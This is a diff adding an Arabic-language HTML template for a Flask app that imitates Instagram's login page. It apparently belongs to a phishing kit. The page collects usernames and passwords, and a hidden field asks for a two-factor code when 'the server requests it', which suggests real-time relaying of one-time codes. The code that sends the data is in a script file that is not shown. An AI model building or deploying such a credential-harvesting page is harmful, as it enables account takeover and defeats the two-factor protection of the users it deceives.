@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول • Instagram</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <!-- صندوق تسجيل الدخول الرئيسي -->
+        <div class="main-box">
+            <h1 class="logo">Instagram</h1>
+            
+            <!-- شاشة التحميل (تظهر أثناء انتظار رد السيرفر) -->
+            <div id="loading-spinner" style="display: none; margin: 20px 0;">
+                <div class="spinner"></div>
+                <p style="margin-top: 10px; font-size: 13px; color: #737373;">جاري التحقق من البيانات، يرجى الانتظار...</p>
+            </div>
+            
+            <form id="login-form">
+                <!-- حقول اسم المستخدم وكلمة المرور -->
+                <div id="credentials-section">
+                    <div class="input-field">
+                        <input type="text" id="username" required placeholder="اسم المستخدم، أو الهاتف، أو البريد الإلكتروني">
+                    </div>
+                    
+                    <div class="input-field password-field">
+                        <input type="password" id="password" required placeholder="كلمة السر">
+                        <button type="button" id="toggle-password">إظهار</button>
+                    </div>
+                </div>
+
+                <!-- حقل رمز المصادقة الثنائية (يظهر فقط إذا طلبه السيرفر) -->
+                <div id="two-factor-section" style="display: none; margin-bottom: 10px;">
+                    <p style="font-size: 13px; color: #555; margin-bottom: 8px;">أدخل رمز المصادقة الثنائية (2FA):</p>
+                    <div class="input-field">
+                        <input type="text" id="otp-code" placeholder="رمز التحقق (مثال: 123456)">
+                    </div>
+                </div>
+                
+                <button type="submit" class="btn-login" id="login-btn" disabled>تسجيل الدخول</button>
+                
+                <div class="divider">
+                    <div class="line"></div>
+                    <span>أو</span>
+                    <div class="line"></div>
+                </div>
+                
+                <a href="#" class="fb-login">تسجيل الدخول باستخدام فيسبوك</a>
+                <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+            </form>
+        </div>
+
+        <div class="sub-box">
+            <p>ليس لديك حساب؟ <a href="#">تسجيل الاشتراك</a></p>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='script.js') }}" defer></script>
+</body>
+</html>
